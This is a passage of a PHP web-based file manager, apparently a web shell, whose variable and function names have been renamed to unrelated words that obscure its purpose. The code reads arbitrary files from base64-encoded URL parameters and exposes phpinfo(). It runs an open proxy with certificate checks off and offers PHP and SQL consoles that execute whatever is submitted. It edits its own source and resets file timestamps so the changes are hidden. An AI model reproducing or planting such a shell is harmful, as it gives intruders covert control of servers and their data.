			if (!empty($officeConfig['fm_restore_time'])) touch(__FILE__,$mesaFileModified);

		}
	} elseif (isset($_POST['tpl_edited'])) { 
		$cartelLanguageTemplate = $_POST['tpl_edited'];


		if (!empty($_POST[$cartelLanguageTemplate.'_name'])) {

			$legalPanel = json_encode(array_combine($_POST[$cartelLanguageTemplate.'_name'],$_POST[$cartelLanguageTemplate.'_value']),JSON_HEX_APOS);



		} elseif (!empty($_POST[$cartelLanguageTemplate.'_new_name'])) {

			$legalPanel = json_encode(json_decode(${$cartelLanguageTemplate.'_templates'},true)+array($_POST[$cartelLanguageTemplate.'_new_name']=>$_POST[$cartelLanguageTemplate.'_new_value']),JSON_HEX_APOS);
		}
		if (!empty($legalPanel)) {


			$goodmanFileContent = file_get_contents(__FILE__);


			$searchCase = preg_match('#'.$cartelLanguageTemplate.'_templates[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $goodmanFileContent, $caseMatches);
			if (!empty($caseMatches[1])) {

				$mesaFileModified = filemtime(__FILE__);
				$replaceHoward = str_replace('{"'.$caseMatches[1].'"}',$legalPanel,$goodmanFileContent);

				if (file_put_contents(__FILE__, $replaceHoward)) {


					${$cartelLanguageTemplate.'_templates'} = $legalPanel;



					$kimMessage .= __('File updated');



				} else $kimMessage .= __('Error occurred');
				if (!empty($officeConfig['fm_restore_time'])) touch(__FILE__,$mesaFileModified);


			}	



		} else $kimMessage .= __('Error occurred');

	}

}

// Just show image
if (isset($_GET['img'])) {



	$mcgillFile=base64_decode($_GET['img']);

	if ($cliffInfo=getimagesize($mcgillFile)){
		switch  ($cliffInfo[2]){	//1=GIF, 2=JPG, 3=PNG, 4=SWF, 5=PSD, 6=BMP

			case 1: $saulExtension='gif'; break;



			case 2: $saulExtension='jpeg'; break;



			case 3: $saulExtension='png'; break;


			case 6: $saulExtension='bmp'; break;



			default: die();
		}
		header("Content-type: image/$saulExtension");



		echo file_get_contents($mcgillFile);



		die();

	}



}





// Just download file
if (isset($_GET['download'])) {
	$mcgillFile=base64_decode($_GET['download']);
	downloadGoodmanFile($mcgillFile);	
}


// Just show info
if (isset($_GET['phpinfo'])) {

	phpinfo(); 
	die();



}

// Mini proxy, many bugs!

if (isset($_GET['proxy']) && (!empty($officeConfig['enable_proxy']))) {
	$officeUrl = isset($_GET['url'])?urldecode($_GET['url']):'';


	$proxyGoodmanForm = '


<div style="position:relative;z-index:100500;background: linear-gradient(to bottom, #e4f5fc 0%,#bfe8f9 50%,#9fd8ef 51%,#2ab0ed 100%);">
	<form action="" method="GET">
	<input type="hidden" name="proxy" value="true">

	'.goodmanHome().' <a href="'.$officeUrl.'" target="_blank">Url</a>: <input type="text" name="url" value="'.$officeUrl.'" size="55">



	<input type="submit" value="'.__('Show').'" class="fm_input">


	</form>


</div>


';
	if ($officeUrl) {
		$betterCallChannel = curl_init($officeUrl);
		curl_setopt($betterCallChannel, CURLOPT_USERAGENT, 'Den1xxx test proxy');
		curl_setopt($betterCallChannel, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($betterCallChannel, CURLOPT_SSL_VERIFYHOST,0);



		curl_setopt($betterCallChannel, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($betterCallChannel, CURLOPT_HEADER, 0);
		curl_setopt($betterCallChannel, CURLOPT_REFERER, $officeUrl);



		curl_setopt($betterCallChannel, CURLOPT_RETURNTRANSFER,true);


		$caseResult = curl_exec($betterCallChannel);
		curl_close($betterCallChannel);


		//$caseResult = preg_replace('#(src)=["\'][http://]?([^:]*)["\']#Ui', '\\1="'.$officeUrl.'/\\2"', $caseResult);



		$caseResult = preg_replace_callback('#(href|src)=["\'][http://]?([^:]*)["\']#Ui', 'officeUrlProxy', $caseResult);



		$caseResult = preg_replace('%(<body.*?>)%i', '$1'.'<style>'.saulHomeStyle().'</style>'.$proxyGoodmanForm, $caseResult);


		echo $caseResult;


		die();
	} 
}
?>

<!doctype html>

<html>
<head>     



	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />



    <title><?=__('File manager')?></title>

<style>
body {

	background-color:	white;


	font-family:		Verdana, Arial, Helvetica, sans-serif;
	font-size:			8pt;

	margin:				0px;
}




a:link, a:active, a:visited { color: #006699; text-decoration: none; }
a:hover { color: #DD6900; text-decoration: underline; }



a.th:link { color: #FFA34F; text-decoration: none; }
a.th:active { color: #FFA34F; text-decoration: none; }
a.th:visited { color: #FFA34F; text-decoration: none; }


a.th:hover {  color: #FFA34F; text-decoration: underline; }


table.bg {
	background-color: #ACBBC6


}

th, td { 
	font:	normal 8pt Verdana, Arial, Helvetica, sans-serif;

	padding: 3px;



}




th	{
	height:				25px;
	background-color:	#006699;
	color:				#FFA34F;
	font-weight:		bold;



	font-size:			11px;


}







.row1 {

	background-color:	#EFEFEF;
}




.row2 {



	background-color:	#DEE3E7;
}




.row3 {



	background-color:	#D1D7DC;
	padding: 5px;



}



tr.row1:hover {


	background-color:	#F3FCFC;


}

tr.row2:hover {



	background-color:	#F0F6F6;
}






.whole {


	width: 100%;
}





.all tbody td:first-child{width:100%;}

textarea {
	font: 9pt 'Courier New', courier;
	line-height: 125%;
	padding: 5px;



}

.textarea_input {


	height: 1em;


}



.textarea_input:focus {



	height: auto;



}


input[type=submit]{


	background: #FCFCFC none !important;

	cursor: pointer;
}







.folder {



    background-image: url("data:image/png;base64,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");
}




.file {



    background-image: url("data:image/png;base64,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");
}
<?=saulHomeStyle()?>



.img {



	background-image: 
url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");



}
@media screen and (max-width:720px){
  table{display:block;}
    #fm_table td{display:inline;float:left;}

    #fm_table tbody td:first-child{width:100%;padding:0;}
    #fm_table tbody tr:nth-child(2n+1){background-color:#EFEFEF;}

    #fm_table tbody tr:nth-child(2n){background-color:#DEE3E7;}



    #fm_table tr{display:block;float:left;clear:left;width:100%;}
	#header_table .row2, #header_table .row3 {display:inline;float:left;width:100%;padding:0;}

	#header_table table td {display:inline;float:left;}
}



</style>



</head>

<body>

<?php
$includedKimUrl = '?fm=true';

if (isset($_POST['sqlrun'])&&!empty($officeConfig['enable_sql_console'])){
	$goodmanResult = empty($_POST['sql']) ? '' : $_POST['sql'];



	$cartelResponseLanguage = 'sql';
} elseif (isset($_POST['phprun'])&&!empty($officeConfig['enable_php_console'])){
	$goodmanResult = empty($_POST['php']) ? '' : $_POST['php'];
	$cartelResponseLanguage = 'php';
} 



if (isset($_GET['fm_settings'])) {


	echo ' 
<table class="whole">
<form method="post" action="">



<tr><th colspan="2">'.__('File manager').' - '.__('Settings').'</th></tr>
'.(empty($kimMessage)?'':'<tr><td class="row2" colspan="2">'.$kimMessage.'</td></tr>').'


'.officeConfigCheckboxRow(__('Show size of the folder'),'show_dir_size').'
'.officeConfigCheckboxRow(__('Show').' '.__('pictures'),'show_img').'
'.officeConfigCheckboxRow(__('Show').' '.__('Make directory'),'make_directory').'

'.officeConfigCheckboxRow(__('Show').' '.__('New file'),'new_file').'
'.officeConfigCheckboxRow(__('Show').' '.__('Upload'),'upload_file').'
'.officeConfigCheckboxRow(__('Show').' PHP version','show_php_ver').'



'.officeConfigCheckboxRow(__('Show').' PHP ini','show_php_ini').'
'.officeConfigCheckboxRow(__('Show').' '.__('Generation time'),'show_gt').'

'.officeConfigCheckboxRow(__('Show').' xls','show_xls').'
'.officeConfigCheckboxRow(__('Show').' PHP '.__('Console'),'enable_php_console').'

'.officeConfigCheckboxRow(__('Show').' SQL '.__('Console'),'enable_sql_console').'



<tr><td class="row1"><input name="fm_config[sql_server]" value="'.$officeConfig['sql_server'].'" type="text"></td><td class="row2 whole">SQL server</td></tr>
<tr><td class="row1"><input name="fm_config[sql_username]" value="'.$officeConfig['sql_username'].'" type="text"></td><td class="row2 whole">SQL user</td></tr>



<tr><td class="row1"><input name="fm_config[sql_password]" value="'.$officeConfig['sql_password'].'" type="text"></td><td class="row2 whole">SQL password</td></tr>



<tr><td class="row1"><input name="fm_config[sql_db]" value="'.$officeConfig['sql_db'].'" type="text"></td><td class="row2 whole">SQL DB</td></tr>
'.officeConfigCheckboxRow(__('Show').' Proxy','enable_proxy').'
'.officeConfigCheckboxRow(__('Show').' phpinfo()','show_phpinfo').'
'.officeConfigCheckboxRow(__('Show').' '.__('Settings'),'fm_settings').'



'.officeConfigCheckboxRow(__('Restore file time after editing'),'restore_time').'
'.officeConfigCheckboxRow(__('File manager').': '.__('Restore file time after editing'),'fm_restore_time').'


<tr><td class="row3"><a href="'.getOfficeUrl().'?fm_settings=true&fm_config_delete=true">'.__('Reset settings').'</a></td><td class="row3"><input type="submit" value="'.__('Save').'" name="fm_config[fm_set_submit]"></td></tr>
</form>


</table>
<table>



<form method="post" action="">

<tr><th colspan="2">'.__('Settings').' - '.__('Authorization').'</th></tr>
<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($howardVerified['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>
<tr><td class="row1"><input name="fm_login[login]" value="'.$howardVerified['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>



<tr><td class="row1"><input name="fm_login[password]" value="'.$howardVerified['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>
<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$howardVerified['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>
<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$howardVerified['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$howardVerified['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>



<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>



</form>


</table>';

echo officeTemplateForm('php'),officeTemplateForm('sql');
} elseif (isset($proxyGoodmanForm)) {
	die($proxyGoodmanForm);



} elseif (isset($cartelResponseLanguage)) {	

?>

<table class="whole">
<tr>



    <th><?=__('File manager').' - '.$mcgillPath?></th>
</tr>
<tr>
    <td class="row2"><table><tr><td><h2><?=strtoupper($cartelResponseLanguage)?> <?=__('Console')?><?php
	if($cartelResponseLanguage=='sql') echo ' - Database: '.$officeConfig['sql_db'].'</h2></td><td>'.runOfficeInput('php');


	else echo '</h2></td><td>'.runOfficeInput('sql');

	?></td></tr></table></td>
</tr>
<tr>
    <td class="row1">
		<a href="<?=$includedKimUrl.'&path=' . $mcgillPath;?>"><?=__('Back')?></a>
		<form action="" method="POST" name="console">


		<textarea name="<?=$cartelResponseLanguage?>" cols="80" rows="10" style="width: 90%"><?=$goodmanResult?></textarea><br/>

		<input type="reset" value="<?=__('Reset')?>">
		<input type="submit" value="<?=__('Submit')?>" name="<?=$cartelResponseLanguage?>run">
<?php
$stringTemplateGoodman = $cartelResponseLanguage.'_templates';
$legalTemplate = !empty($$stringTemplateGoodman) ? json_decode($$stringTemplateGoodman,true) : '';
if (!empty($legalTemplate)){
	$cinnabonActive = isset($_POST[$cartelResponseLanguage.'_tpl']) ? $_POST[$cartelResponseLanguage.'_tpl'] : '';

